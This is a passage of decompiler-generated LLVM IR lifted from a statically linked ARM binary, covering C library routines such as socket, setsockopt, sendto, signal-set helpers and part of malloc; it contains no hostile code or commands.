  %v24_119d0 = load i32, i32* @lr, align 4
  %v4_119e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 12800) to i32*), align 4
  %v2_119e8 = icmp eq i32 %v4_119e0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_119e8, label %dec_label_pc_11a08, label %dec_label_pc_11a14

dec_label_pc_11a08:                               ; preds = %entry
  store i32 %v3_119d0, i32* @r4, align 4
  store i32 %v12_119d0, i32* @r7, align 4
  store i32 %v15_119d0, i32* @r8, align 4
  store i32 %v18_119d0, i32* %sb.global-to-local, align 4
  %v0_11a10 = call i32 @__sys_sendto()
  br label %dec_label_pc_11a14

dec_label_pc_11a14:                               ; preds = %entry, %dec_label_pc_11a08
  %v0_11a14 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11a14, i32* @r5, align 4
  %v0_11a28 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11a28, i32* @r0, align 4
  %v0_11a30 = call i32 @__sys_sendto()
  store i32 %v0_11a30, i32* @r4, align 4
  %v0_11a38 = load i32, i32* @r5, align 4
  %v1_11a3c = call i32 @__libc_disable_asynccancel(i32 %v0_11a38)
  %v0_11a40 = load i32, i32* @r4, align 4
  %v2_11a48 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11a48, i32* @r4, align 4
  store i32 %v6_119d0, i32* @r5, align 4
  store i32 %v9_119d0, i32* @r6, align 4
  store i32 %v12_119d0, i32* @r7, align 4
  store i32 %v15_119d0, i32* @r8, align 4
  store i32 %v18_119d0, i32* @sb, align 4
  store i32 %v21_119d0, i32* @sl, align 4
  store i32 %v24_119d0, i32* @lr, align 4
  ret i32 %v0_11a40

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a14, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11a58 = load i32, i32* @r4, align 4
  store i32 %v3_11a58, i32* %stack_var_-12, align 4
  %v0_11a68 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a68, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a68, -4095
  br i1 %tmp, label %dec_label_pc_11a90, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %entry
  %v0_11a7c = call i32 @__aeabi_read_tp()
  %v3_11a80 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11a80 = sext i16 %v3_11a80 to i32
  store i32 %v4_11a80, i32* @r3, align 4
  %v0_11a84 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a84 = sub i32 0, %v0_11a84
  store i32 %v1_11a84, i32* %r2.global-to-local, align 4
  %v3_11a88 = add i32 %v4_11a80, %v0_11a7c
  %v4_11a88 = inttoptr i32 %v3_11a88 to i32*
  store i32 %v1_11a84, i32* %v4_11a88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11a90.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %entry, %dec_label_pc_11a78
  %v1_11a94 = phi i32 [ %v0_11a68, %entry ], [ -1, %dec_label_pc_11a78 ]
  %v2_11a90 = phi i32 [ %v3_11a58, %entry ], [ %v2_11a90.pre, %dec_label_pc_11a78 ]
  store i32 %v2_11a90, i32* @r4, align 4
  ret i32 %v1_11a94

; uselistorder directives
  uselistorder i32 %v0_11a68, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a90, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11a98:
  %v0_11a98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a98, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a98
  %v2_11a98 = load i32, i32* @r6, align 4
  %v5_11a98 = udiv i32 %v2_11a98, 4
  %v6_11a98 = and i32 %v5_11a98, %arg1
  call void @__pseudo_branch(i32 0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a98, %bb
  %v7_11a9c = phi i32 [ %arg1, %dec_label_pc_11a98 ], [ %v6_11a98, %bb ]
  ret i32 %v7_11a9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11aa0 = load i32, i32* @r7, align 4
  store i32 %v3_11aa0, i32* %stack_var_-8, align 4
  %v0_11aac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11aac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11aac, -4095
  br i1 %tmp, label %dec_label_pc_11ad4, label %dec_label_pc_11abc

dec_label_pc_11abc:                               ; preds = %entry
  %v0_11ac0 = call i32 @__aeabi_read_tp()
  %v3_11ac4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11ac4 = sext i16 %v3_11ac4 to i32
  store i32 %v4_11ac4, i32* @r3, align 4
  %v0_11ac8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ac8 = sub i32 0, %v0_11ac8
  store i32 %v1_11ac8, i32* %r2.global-to-local, align 4
  %v3_11acc = add i32 %v4_11ac4, %v0_11ac0
  %v4_11acc = inttoptr i32 %v3_11acc to i32*
  store i32 %v1_11ac8, i32* %v4_11acc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ad4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ad4

dec_label_pc_11ad4:                               ; preds = %entry, %dec_label_pc_11abc
  %v1_11ad8 = phi i32 [ %v0_11aac, %entry ], [ -1, %dec_label_pc_11abc ]
  %v2_11ad4 = phi i32 [ %v3_11aa0, %entry ], [ %v2_11ad4.pre, %dec_label_pc_11abc ]
  store i32 %v2_11ad4, i32* @r7, align 4
  ret i32 %v1_11ad8

; uselistorder directives
  uselistorder i32 %v0_11aac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ad4, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11adc:
  %v0_11adc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11adc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11adc
  %v3_11ae0 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11adc, %bb
  %v4_11ae0 = phi i32 [ %arg1, %dec_label_pc_11adc ], [ %v3_11ae0, %bb ]
  ret i32 %v4_11ae0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_11afc, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %entry
  %v7_11af8 = icmp slt i32 %arg2, 65
  br i1 %v7_11af8, label %dec_label_pc_11b18, label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11af4, %entry
  %v0_11b00 = call i32 @__aeabi_read_tp()
  %v3_11b04 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11b04 = sext i16 %v3_11b04 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11b10 = add i32 %v4_11b04, %v0_11b00
  %v4_11b10 = inttoptr i32 %v3_11b10 to i32*
  store i32 22, i32* %v4_11b10, align 4
  %v0_11b20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b20

dec_label_pc_11b18:                               ; preds = %dec_label_pc_11af4
  %v0_11b18 = call i32 @__sigaddset()
  store i32 %v0_11b18, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11afc, %dec_label_pc_11b18
  %v0_11b20 = phi i32 [ %v0_11b20.pre, %dec_label_pc_11afc ], [ %v0_11b18, %dec_label_pc_11b18 ]
  ret i32 %v0_11b20

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b20, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11b3c = add i32 %tmp, 4
  %v3_11b3c = inttoptr i32 %v2_11b3c to i32*
  store i32 0, i32* %v3_11b3c, align 4
  %v1_11b40 = load i32, i32* %r3.global-to-local, align 4
  %v2_11b40 = inttoptr i32 %v1_11b40 to i32*
  store i32 0, i32* %v2_11b40, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b48 = load i32, i32* @r4, align 4
  store i32 %v3_11b48, i32* %stack_var_-16, align 4
  %v6_11b48 = load i32, i32* @r5, align 4
  %v9_11b48 = load i32, i32* @r6, align 4
  %v7_11b50 = icmp eq i32 %arg2, -1
  br i1 %v7_11b50, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11b58 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_11b74

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11b7c

dec_label_pc_11b74:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r6, align 4
  %v7_11b78 = icmp slt i32 %arg1, 65
  br i1 %v7_11b78, label %dec_label_pc_11b98, label %dec_label_pc_11b7c

dec_label_pc_11b7c:                               ; preds = %.thread16, %dec_label_pc_11b74
  %v0_11b80 = call i32 @__aeabi_read_tp()
  %v3_11b84 = load i16, i16* @global_var_21a48.352, align 2
  %v4_11b84 = sext i16 %v3_11b84 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11b90 = add i32 %v4_11b84, %v0_11b80
  %v4_11b90 = inttoptr i32 %v3_11b90 to i32*
  store i32 22, i32* %v4_11b90, align 4
  %v0_11bf0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b74
  %v2_11b98 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11b98, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11ba0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11ba0, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11bb0 = call i32 @__sigaddset()
  %v0_11bb8 = load i32, i32* @r5, align 4
  store i32 %v0_11bb8, i32* %r1.global-to-local, align 4
  %v0_11bbc = load i32, i32* @r6, align 4
  %v2_11bbc = add i32 %v0_11bbc, 11896
  %v2_11bc0 = call i32 @__GI___sigismember(i32 %v2_11bbc, i32 %v0_11bb8)
  store i32 %v2_11b98, i32* %r1.global-to-local, align 4
  %v0_11bd4 = load i32, i32* @r5, align 4
  %v3_11be0 = call i32 @__libc_sigaction(i32 %v0_11bd4, i32 %v2_11b98, i32 %v2_11b58)
  %v1_11be4 = icmp slt i32 %v3_11be0, 0
  br i1 %v1_11be4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11b98
  %v5_11be8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_11be8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11b98
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11b7c, %bb32
  %v0_11bf0 = phi i32 [ %v5_11be8, %bb31 ], [ %v0_11bf0.pre, %dec_label_pc_11b7c ], [ -1, %bb32 ]
  %v2_11bf8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11bf8, i32* @r4, align 4
  store i32 %v6_11b48, i32* @r5, align 4
  store i32 %v9_11b48, i32* @r6, align 4
  ret i32 %v0_11bf0

; uselistorder directives
  uselistorder i32 %v2_11b98, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11b7c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11c0c = add i32 %arg2, -1
  %v3_11c10 = udiv i32 %v1_11c0c, 32
  %v4_11c14 = mul nuw nsw i32 %v3_11c10, 4
  %v5_11c14 = add i32 %v4_11c14, %arg1
  %v6_11c14 = inttoptr i32 %v5_11c14 to i32*
  %v7_11c14 = load i32, i32* %v6_11c14, align 4
  %v1_11c18 = urem i32 %v1_11c0c, 32
  %v7_11c20 = shl i32 1, %v1_11c18
  %v8_11c20 = and i32 %v7_11c14, %v7_11c20
  %v10_11c20 = icmp ne i32 %v8_11c20, 0
  %. = zext i1 %v10_11c20 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11c0c, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_11c30 = load i32, i32* @r1, align 4
  %v1_11c30 = add i32 %v0_11c30, -1
  %v3_11c34 = udiv i32 %v1_11c30, 32
  %v0_11c38 = load i32, i32* @r0, align 4
  %v4_11c38 = mul nuw nsw i32 %v3_11c34, 4
  %v5_11c38 = add i32 %v0_11c38, %v4_11c38
  %v6_11c38 = inttoptr i32 %v5_11c38 to i32*
  %v7_11c38 = load i32, i32* %v6_11c38, align 4
  %v1_11c3c = urem i32 %v1_11c30, 32
  %v7_11c44 = shl i32 1, %v1_11c3c
  %v8_11c44 = or i32 %v7_11c38, %v7_11c44
  store i32 %v8_11c44, i32* %v6_11c38, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c30, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11c54 = add i32 %arg2, -1
  %v3_11c58 = udiv i32 %v1_11c54, 32
  %v4_11c5c = mul nuw nsw i32 %v3_11c58, 4
  %v5_11c5c = add i32 %v4_11c5c, %arg1
  %v6_11c5c = inttoptr i32 %v5_11c5c to i32*
  %v7_11c5c = load i32, i32* %v6_11c5c, align 4
  %v1_11c60 = urem i32 %v1_11c54, 32
  %tmp = shl i32 -1, %v1_11c60
  %v8_11c68 = add i32 %tmp, -1
  %v9_11c68 = and i32 %v7_11c5c, %v8_11c68
  store i32 %v9_11c68, i32* %v6_11c5c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11c54, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11c78 = udiv i32 %arg1, 256
  store i32 %v3_11c78, i32* %r1.global-to-local, align 4
  %v2_11c7c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11c7c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_11c88 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11c7c, i32 %v0_11c88)
  %v0_11c8c = load i32, i32* %r1.global-to-local, align 4
  %v1_11c8c = add i32 %v0_11c8c, 1048320
  %v3_11c90 = udiv i32 %v1_11c8c, 65536
  %v1_11c94 = and i32 %v3_11c90, 8
  %v6_11c98 = shl i32 %v0_11c8c, %v1_11c94
  %v1_11c9c = add i32 %v6_11c98, 520192
  %v3_11ca0 = udiv i32 %v1_11c9c, 65536
  %v1_11ca4 = and i32 %v3_11ca0, 4
  %v6_11ca8 = shl i32 %v6_11c98, %v1_11ca4
  %v1_11cac = add i32 %v6_11ca8, 245760
  %v3_11cb0 = udiv i32 %v1_11cac, 65536
  %v1_11cb4 = and i32 %v3_11cb0, 2
  %v6_11cb8 = shl i32 %v6_11ca8, %v1_11cb4
  store i32 %v6_11cb8, i32* %r1.global-to-local, align 4
  %v1_11cbc = sub nsw i32 13, %v1_11c94
  %v2_11cc0 = sub nsw i32 %v1_11cbc, %v1_11ca4
  %v3_11cc4 = udiv i32 %v6_11cb8, 32768
  %v4_11cc4 = sub nuw nsw i32 -1, %v3_11cc4
  %v4_11cc8 = udiv i32 %v6_11cb8, 16384
  %v5_11cc8 = and i32 %v4_11cc8, %v4_11cc4
  %v2_11ccc = sub nsw i32 %v2_11cc0, %v1_11cb4
  %v2_11cd0 = add nsw i32 %v2_11ccc, %v5_11cc8
  %v1_11cd4 = add nsw i32 %v2_11cd0, 6
  %v0_11cd8 = load i32, i32* %ip.global-to-local, align 4
  %v6_11cd8 = lshr i32 %v0_11cd8, %v1_11cd4
  %v3_11cdc = mul nsw i32 %v2_11cd0, 4
  %v1_11ce0 = add nsw i32 %v3_11cdc, 32
  %v1_11ce4 = urem i32 %v6_11cd8, 4
  %v2_11ce8 = or i32 %v1_11ce4, %v1_11ce0
  ret i32 %v2_11ce8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11cf0 = load i32, i32* @r4, align 4
  %v6_11cf0 = load i32, i32* @r5, align 4
  %v9_11cf0 = load i32, i32* @r6, align 4
  %v12_11cf0 = load i32, i32* @r7, align 4
  %v15_11cf0 = load i32, i32* @r8, align 4
  %v18_11cf0 = load i32, i32* @sb, align 4
  %v21_11cf0 = load i32, i32* @sl, align 4
  %v24_11cf0 = load i32, i32* @fp, align 4
  %v27_11cf0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_11d04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 108) to i32*), align 4
  store i32 %v4_11d04, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_11d10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), align 4
  store i32 %v4_11d10, i32* %r1.global-to-local, align 4
  %v0_11d14 = load i32, i32* @r0, align 4
  store i32 %v0_11d14, i32* @r5, align 4
  store i32 %v4_11d04, i32* %r2.global-to-local, align 4
  %v2_11d1c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11d1c, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v4_11d28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  store i32 %v4_11d28, i32* %ip.global-to-local, align 4
  store i32 73012, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11d28)
  %v0_11d34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11d34, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r1, align 4
  %v4_11d40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 16) to i32*), align 4
  store i32 %v4_11d40, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11d4c.440 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11d40)
  %v0_11d4c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11d4c, -32
  br i1 %tmp, label %dec_label_pc_11d70, label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %entry
  store i32 64740, i32* %r2.global-to-local, align 4
  %v0_11d58 = call i32 @__aeabi_read_tp()
  store i32 %v0_11d58, i32* %r0.global-to-local, align 4
  %v3_11d5c = load i16, i16* @global_var_21a48.352, align 2
  %v4_11d5c = sext i16 %v3_11d5c to i32
  store i32 %v4_11d5c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11d68 = add i32 %v4_11d5c, %v0_11d58
  %v4_11d68 = inttoptr i32 %v3_11d68 to i32*
  store i32 12, i32* %v4_11d68, align 4
  br label %dec_label_pc_125f4

dec_label_pc_11d70:                               ; preds = %entry
  %v1_11d70 = add i32 %v0_11d4c, 11
  store i32 %v1_11d70, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v2_11d7c = icmp ugt i32 %v1_11d70, 14
  %v7_11d7c = icmp eq i32 %v1_11d70, 15
  %v2_11d80 = xor i1 %v7_11d7c, true
  %v3_11d80 = and i1 %v2_11d7c, %v2_11d80
  br i1 %v3_11d80, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_11d70
  %v5_11d80 = and i32 %v1_11d70, -8
  store i32 %v5_11d80, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_11d70, %bb
  %v4_11d84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d84, i32* @r0, align 4
  %v1_11d88 = inttoptr i32 %v4_11d84 to i32*
  %v2_11d88 = load i32, i32* %v1_11d88, align 4
  store i32 %v2_11d88, i32* @r4, align 4
  %v2_11d8c = xor i1 %v2_11d7c, true
  %v3_11d8c = or i1 %v7_11d7c, %v2_11d8c
  br i1 %v3_11d8c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_11d90 = urem i32 %v2_11d88, 2
  %v2_11d90 = icmp eq i32 %v1_11d90, 0
  br i1 %v2_11d90, label %dec_label_pc_11d98, label %dec_label_pc_11da8

dec_label_pc_11d98:                               ; preds = %bb143
  %v2_11d98 = icmp eq i32 %v2_11d88, 0
  br i1 %v2_11d98, label %dec_label_pc_11da0, label %dec_label_pc_12184

dec_label_pc_11da0:                               ; preds = %dec_label_pc_11d98
  %v0_11da0 = call i32 @__malloc_consolidate()
  store i32 %v0_11da0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12184

dec_label_pc_11da8:                               ; preds = %bb143
  %v0_11da8 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_11da8, %v2_11d88
  br i1 %tmp204, label %dec_label_pc_11dd0, label %dec_label_pc_11db0

dec_label_pc_11db0:                               ; preds = %dec_label_pc_11da8
  %v1_11db0 = add i32 %v4_11d84, -4
  store i32 %v1_11db0, i32* %r1.global-to-local, align 4
  %v3_11db4 = udiv i32 %v0_11da8, 8
  store i32 %v3_11db4, i32* %r2.global-to-local, align 4
  %v4_11db8 = mul nuw i32 %v3_11db4, 4
  %v5_11db8 = add i32 %v4_11db8, %v1_11db0
  %v6_11db8 = inttoptr i32 %v5_11db8 to i32*
  %v7_11db8 = load i32, i32* %v6_11db8, align 4
  store i32 %v7_11db8, i32* %r0.global-to-local, align 4
  %v2_11dbc = icmp eq i32 %v7_11db8, 0
  br i1 %v2_11dbc, label %dec_label_pc_11dd0, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11db0
  %v2_11dc0 = add i32 %v7_11db8, 8
  %v3_11dc0 = inttoptr i32 %v2_11dc0 to i32*
  %v4_11dc0 = load i32, i32* %v3_11dc0, align 4
  store i32 %v4_11dc0, i32* %r3.global-to-local, align 4
  store i32 %v2_11dc0, i32* %r0.global-to-local, align 4
  store i32 %v2_11dc0, i32* %r4.global-to-local, align 4
  store i32 %v4_11dc0, i32* %v6_11db8, align 4
  br label %dec_label_pc_125d8

dec_label_pc_11dd0:                               ; preds = %dec_label_pc_11db0, %dec_label_pc_11da8
  %tmp205 = icmp ugt i32 %v0_11da8, 255
  br i1 %tmp205, label %dec_label_pc_11e20, label %dec_label_pc_11dd8

dec_label_pc_11dd8:                               ; preds = %dec_label_pc_11dd0
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11de0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  %v3_11de4 = udiv i32 %v0_11da8, 8
  store i32 %v3_11de4, i32* @r7, align 4
  %v4_11de8 = mul nuw i32 %v3_11de4, 8
  %v5_11de8 = add i32 %v4_11de0, %v4_11de8
  store i32 %v5_11de8, i32* %r3.global-to-local, align 4
  %v1_11dec = add i32 %v5_11de8, 44
  store i32 %v1_11dec, i32* %ip.global-to-local, align 4
  %v1_11df0 = add i32 %v5_11de8, 56
  %v2_11df0 = inttoptr i32 %v1_11df0 to i32*
  %v3_11df0 = load i32, i32* %v2_11df0, align 4
  store i32 %v3_11df0, i32* %r0.global-to-local, align 4
  %v9_11df4 = icmp eq i32 %v3_11df0, %v1_11dec
  br i1 %v9_11df4, label %dec_label_pc_11f80, label %dec_label_pc_11dfc

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11dd8
  %v2_11dfc = add i32 %v3_11df0, %v0_11da8
  store i32 %v2_11dfc, i32* %r3.global-to-local, align 4
  %v1_11e00 = add i32 %v2_11dfc, 4
  %v2_11e00 = inttoptr i32 %v1_11e00 to i32*
  %v3_11e00 = load i32, i32* %v2_11e00, align 4
  store i32 %v3_11e00, i32* %r2.global-to-local, align 4
  %v1_11e04 = add i32 %v3_11df0, 12
  %v2_11e04 = inttoptr i32 %v1_11e04 to i32*
  %v3_11e04 = load i32, i32* %v2_11e04, align 4
  store i32 %v3_11e04, i32* %r1.global-to-local, align 4
  %v1_11e08 = or i32 %v3_11e00, 1
  store i32 %v1_11e08, i32* %r2.global-to-local, align 4
  %v1_11e0c = add i32 %v3_11df0, 8
  store i32 %v1_11e0c, i32* %r4.global-to-local, align 4
  store i32 %v1_11e08, i32* %v2_11e00, align 4
  %v0_11e14 = load i32, i32* %ip.global-to-local, align 4
  %v1_11e14 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e14 = add i32 %v1_11e14, 8
  %v3_11e14 = inttoptr i32 %v2_11e14 to i32*
  store i32 %v0_11e14, i32* %v3_11e14, align 4
  %v0_11e18 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e18 = load i32, i32* %ip.global-to-local, align 4
  %v2_11e18 = add i32 %v1_11e18, 12
  %v3_11e18 = inttoptr i32 %v2_11e18 to i32*
  store i32 %v0_11e18, i32* %v3_11e18, align 4
  br label %dec_label_pc_125d8

dec_label_pc_11e20:                               ; preds = %dec_label_pc_11dd0
  store i32 %v0_11da8, i32* %r0.global-to-local, align 4
  %v1_11e24 = call i32 @__malloc_largebin_index(i32 %v0_11da8)
  store i32 %v1_11e24, i32* %r0.global-to-local, align 4
  %v0_11e28 = load i32, i32* @r4, align 4
  %v1_11e28 = and i32 %v0_11e28, 2
  %v2_11e28 = icmp eq i32 %v1_11e28, 0
  store i32 %v1_11e24, i32* @r7, align 4
  br i1 %v2_11e28, label %dec_label_pc_11f80, label %dec_label_pc_11e34

dec_label_pc_11e34:                               ; preds = %dec_label_pc_11e20
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  %v4_11e3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_11e3c, i32* @r0, align 4
  %v0_11e40 = call i32 @__malloc_consolidate()
  store i32 %v0_11e40, i32* %r0.global-to-local, align 4
